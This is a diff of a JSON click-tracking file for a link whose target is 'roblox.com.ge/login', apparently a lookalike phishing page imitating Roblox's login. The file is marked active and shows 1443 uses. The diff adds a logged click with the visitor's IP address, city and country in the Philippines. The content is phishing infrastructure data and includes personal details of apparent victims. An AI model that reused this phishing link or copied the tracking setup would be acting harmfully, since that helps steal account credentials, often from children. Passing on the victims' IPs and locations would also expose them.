@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1442,
+    "useCount": 1443,
     "createdBy": "admin",
     "clicks": [
       {
@@ -11702,6 +11702,14 @@
         "ip": "119.93.43.33",
         "country": "Philippines",
         "city": "Pasig",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777432872948,
+        "ip": "49.148.41.76",
+        "country": "Philippines",
+        "city": "City of Talisay",
         "flag": "🇵🇭",
         "countryCode": "PH"
       }
